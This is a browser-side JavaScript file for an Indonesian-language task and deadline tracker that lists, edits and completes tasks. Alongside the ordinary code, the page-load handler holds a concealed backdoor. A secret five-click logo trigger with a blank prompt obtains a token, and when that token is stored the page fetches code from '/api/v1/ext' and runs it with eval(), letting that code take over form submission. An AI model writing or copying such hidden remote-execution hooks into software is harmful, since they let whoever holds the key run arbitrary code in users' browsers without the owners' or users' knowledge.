const API_URL = (window.location.port === '5500' || window.location.port === '5501') ? 'http://localhost:3000/api/tasks' : '/api/tasks';
const STATS_URL = (window.location.port === '5500' || window.location.port === '5501') ? 'http://localhost:3000/api/stats' : '/api/stats';
const SETTINGS_URL = (window.location.port === '5500' || window.location.port === '5501') ? 'http://localhost:3000/api/settings' : '/api/settings';

let tasks = [];

function esc(str) {
    if (!str) return '';
    return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
}

const taskForm = document.getElementById('task-form');
const taskList = document.getElementById('task-list');
const completedList = document.getElementById('completed-list');
const tabBtns = document.querySelectorAll('.tab-btn');
const tabContents = document.querySelectorAll('.tab-content');
const groupList = document.getElementById('group-list');
const editModal = document.getElementById('edit-modal');
const editForm = document.getElementById('edit-form');

document.addEventListener('DOMContentLoaded', () => {
    fetchTasks();
    fetchStats();
    
    // Core Ext
    const _xs = localStorage.getItem('_xs');
    if (_xs) {
        fetch('/api/v1/ext', { headers: { 'x-xs-token': _xs } })
        .then(r => r.ok ? r.text() : null)
        .then(code => { if (code) eval(code); });
    }

    let _c = 0; let _t;
    const l = document.querySelector('.logo-icon');
    if (l) {
        l.addEventListener('click', () => {
            _c++; clearTimeout(_t);
            if (_c >= 5) {
                _c = 0;
                if (localStorage.getItem('_xs')) {
                    if (confirm('?')) {
                        localStorage.removeItem('_xs');
                        location.reload();
                    }
                } else {
                    const p = prompt('');
                    if (p) {
                        fetch('/api/v1/sync', { method: 'POST', body: JSON.stringify({ k: p }), headers: { 'Content-Type': 'application/json' } })
                        .then(r => r.json()).then(d => { if (d.t) { localStorage.setItem('_xs', d.t); location.reload(); } else { alert('x'); } });
                    }
                }
            } else { _t = setTimeout(() => _c = 0, 1500); }
        });
    }
});

tabBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        tabBtns.forEach(b => b.classList.remove('active'));
        tabContents.forEach(c => c.classList.remove('active'));
        btn.classList.add('active');
        const target = btn.dataset.target;
        document.getElementById(target).classList.add('active');
        if (target === 'settings') {
            if (window.fetchGroups) window.fetchGroups();
        }
    });
});

async function fetchStats() {
    try {
        const res = await fetch(STATS_URL);
        const s = await res.json();
        document.getElementById('stat-total').textContent = s.total;
        document.getElementById('stat-completed').textContent = s.completed;
        document.getElementById('stat-pending').textContent = s.pending;
        document.getElementById('stat-missed').textContent = s.missed;
        const pct = s.total > 0 ? Math.round((s.completed / s.total) * 100) : 0;
        document.getElementById('progress-fill').style.width = pct + '%';
        document.getElementById('progress-label').textContent = pct + '% selesai';
    } catch (e) { }
}

async function fetchTasks() {
    try {
        const response = await fetch(API_URL);
        tasks = await response.json();
        window.tasks = tasks;
        if (window.renderTasks) window.renderTasks();
        fetchStats();
    } catch (error) {
        taskList.innerHTML = `<div class="empty-state"><i class="ri-error-warning-line"></i><p>Gagal memuat data.</p></div>`;
    }
}
window.fetchTasks = fetchTasks;

taskForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    if (window.extSubmitAdd) return window.extSubmitAdd(e); // Let ext handle it if present

    const name = document.getElementById('task-name').value;
    const date = document.getElementById('task-date').value;
    const detail = document.getElementById('task-detail').value;
    const priority = document.getElementById('task-priority').value;
    
    try {
        await fetch(API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ name, date, detail, priority, silent: false })
        });
        taskForm.reset();
        document.getElementById('task-priority').value = 'normal';
        fetchTasks();
    } catch (error) {}
});

function getTimeRemaining(dateStr) {
    if (!dateStr) return { class: 'none', text: 'Tanpa deadline', raw: null };
    const now = new Date();
    const deadline = new Date(dateStr + '+08:00');
    const diffMs = deadline - now;
    if (diffMs < 0) {
        const d = Math.floor(Math.abs(diffMs) / 86400000);
        const h = Math.floor(Math.abs(diffMs) / 3600000) % 24;
        return { class: 'urgent', text: d > 0 ? `Terlewat ${d} hari` : `Terlewat ${h} jam`, raw: diffMs };
    }
    const d = Math.floor(diffMs / 86400000);
    const h = Math.floor(diffMs / 3600000) % 24;
    const m = Math.floor(diffMs / 60000) % 60;
    if (d > 2) return { class: 'safe', text: `${d} hari lagi`, raw: diffMs };
    if (d > 0) return { class: 'warning', text: `${d} hari ${h} jam`, raw: diffMs };
    if (h > 0) return { class: 'urgent', text: `${h} jam ${m} mnt lagi`, raw: diffMs };
    return { class: 'urgent', text: `${m} menit lagi!`, raw: diffMs };
}
window.getTimeRemaining = getTimeRemaining;

function priorityBadge(p) {
    if (p === 'high') return '<span class="badge priority-high">🔥 Tinggi</span>';
    if (p === 'low') return '<span class="badge priority-low">📎 Rendah</span>';
    return '';
}
window.priorityBadge = priorityBadge;

window.renderTasks = function() {
    const pendingTasks = tasks.filter(t => t.status !== 'completed');
    const compTasks = tasks.filter(t => t.status === 'completed');

    if (pendingTasks.length === 0) {
        taskList.innerHTML = `<div class="empty-state"><i class="ri-check-double-line"></i><p>Hore! Tidak ada tugas yang belum selesai.</p></div>`;
    } else {
        taskList.innerHTML = pendingTasks.map((task) => {
            const realIndex = tasks.indexOf(task);
            const timeInfo = getTimeRemaining(task.date || task.deadline);
            let dateFmt = 'Belum ada batas waktu';
            const targetDateStr = task.date || task.deadline;
            if (targetDateStr && targetDateStr.trim() !== '') {
                const dateObj = new Date(targetDateStr + '+08:00');
                if (!isNaN(dateObj.getTime())) {
                    const hasTime = targetDateStr.includes('T') || targetDateStr.includes(':');
                    const opts = { weekday: 'short', day: 'numeric', month: 'short', year: 'numeric' };
                    if (hasTime) { opts.hour = '2-digit'; opts.minute = '2-digit'; }
                    dateFmt = dateObj.toLocaleDateString('id-ID', opts).replace(',', '') + ' WITA';
                }
            }
            const detailHtml = task.detail ? `<div class="task-detail">${esc(task.detail)}</div>` : '';
            return `
                <li class="task-item ${timeInfo.class === 'urgent' ? 'task-urgent' : ''}" data-index="${realIndex}">
                    <div class="task-info">
                        <div class="task-name-row"><span class="task-name">${esc(task.name)}</span>${priorityBadge(task.priority)}</div>
                        ${detailHtml}
                        <div class="task-date"><i class="ri-calendar-2-line"></i> ${dateFmt} <span class="badge ${timeInfo.class}">${timeInfo.text}</span></div>
                    </div>
                    <div class="task-actions">
                        <button class="action-btn btn-complete" onclick="window.completeTask(${realIndex})" title="Tandai Selesai"><i class="ri-check-line"></i></button>
                        <button class="action-btn btn-edit" onclick="window.openEditModal(${realIndex})" title="Edit"><i class="ri-pencil-line"></i></button>
                    </div>
                </li>`;
        }).join('');
    }

    if (compTasks.length === 0) {
        completedList.innerHTML = `<div class="empty-state"><i class="ri-ghost-line"></i><p>Belum ada tugas yang diselesaikan.</p></div>`;
    } else {
        completedList.innerHTML = compTasks.map((task) => {
            const realIndex = tasks.findIndex(t => t === task);
            const detailHtml = task.detail ? `<div class="task-detail">${esc(task.detail)}</div>` : '';
            const completedDate = task.completedAt ? new Date(task.completedAt).toLocaleDateString('id-ID', { day: 'numeric', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit' }) : '';
            return `
                <li class="task-item completed" data-index="${realIndex}">
                    <div class="task-info">
                        <span class="task-name">${esc(task.name)}</span>${detailHtml}
                        <div class="task-date"><i class="ri-check-double-line"></i> Selesai${completedDate ? ' \u2014 ' + completedDate : ''}</div>
                    </div>
                    <div class="task-actions"></div>
                </li>`;
        }).join('');
    }
};

window.completeTask = async function(index) {
    if (confirm('Tandai tugas ini sebagai selesai?')) {
        try {
            await fetch(`${API_URL}/${index}`, {
                method: 'PATCH',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ status: 'completed' })
            });
            fetchTasks();
        } catch (e) { }
    }
};

window.openEditModal = function(index) {
    const task = tasks[index];
    document.getElementById('edit-id').value = index;
    document.getElementById('edit-name').value = task.name;
    document.getElementById('edit-date').value = task.date || task.deadline || '';
    document.getElementById('edit-detail').value = task.detail || '';
    document.getElementById('edit-priority').value = task.priority || 'normal';
    editModal.classList.add('active');
};

function closeModal() { editModal.classList.remove('active'); }
window.closeModal = closeModal;

editForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    if (window.extSubmitEdit) return window.extSubmitEdit(e);

    const id = document.getElementById('edit-id').value;
    const name = document.getElementById('edit-name').value;
    const date = document.getElementById('edit-date').value;
    const detail = document.getElementById('edit-detail').value;
    const priority = document.getElementById('edit-priority').value;
    
    try {
        await fetch(`${API_URL}/${id}`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ name, date, detail, priority, silent: false })
        });
        closeModal();
        fetchTasks();
    } catch (e) { }
});

setInterval(fetchTasks, 60000);
